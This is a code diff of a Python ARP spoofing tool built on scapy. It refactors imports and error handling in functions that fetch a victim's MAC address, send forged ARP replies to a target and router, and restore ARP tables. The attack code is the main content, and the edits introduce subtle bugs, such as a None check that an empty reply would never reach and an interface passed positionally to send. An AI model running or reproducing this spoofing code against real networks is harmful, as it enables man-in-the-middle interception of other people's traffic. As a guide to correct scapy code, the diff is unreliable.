@@ -1,4 +1,4 @@
-from scapy.all import Ether, ARP, send, srp
+import scapy.all as sc
 from argparse import ArgumentParser
 from os import getuid
 
@@ -41,25 +41,22 @@ def get_mac(ip):
         This function returns the MAC address of the IP address
     """
 
-    brodcast = Ether(pdst="ff:ff:ff:ff:ff:ff") / ARP(pdst = ip)
+    brodcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff") / sc.ARP(pdst = ip)
     
-    try:
-        reply = srp(brodcast, timeout = 1, verbose = False)[0]
-    
-    except Exception as e:
-        print(f"Error: {e}")
-        exit(f"[!] Unable to find the MAC address of the {ip}")
+    reply = sc.srp(brodcast, timeout = 1, verbose = False)[0]
+    mac = reply[0][1].hwsrc
 
-    else:
-        mac = reply[0][1].hwsrc
-        return mac
+    if mac == None:
+        exit(f"[!] Unable to find the MAC address of the {ip}\n[!] Exiting...")
+
+    return mac
 
 def spoof(target_ip, spoof_ip, interface):
     """
         It will send the fake ARP packets to the victim/target and router
     """
 
-    packet = ARP(
+    packet = sc.ARP(
         op = 2, 
         pdst = target_ip,
         hwdst = get_mac(target_ip),
@@ -67,7 +64,7 @@ def spoof(target_ip, spoof_ip, interface):
     )
 
     try: 
-        send(packet, iface=interface, verbose = False)
+        sc.send(packet, interface, verbose = False)
         # print(f"[*] Spoofed packet sent to {target_ip}")
     
     except Exception as e:
@@ -79,7 +76,7 @@ def restore(original_ip, spoofed_ip, interface):
         It will restore the original MAC for the victim IP on ARP table
     """
 
-    packet = ARP(
+    packet = sc.ARP(
         op = 2, 
         pdst = original_ip,
         hwdst = get_mac(original_ip),
@@ -88,7 +85,7 @@ def restore(original_ip, spoofed_ip, interface):
     )
 
     try: 
-        send(packet, iface=interface, verbose = False)
+        sc.send(packet, interface, verbose = False)
     
     except Exception as e:
         print(f"Error: {e}")
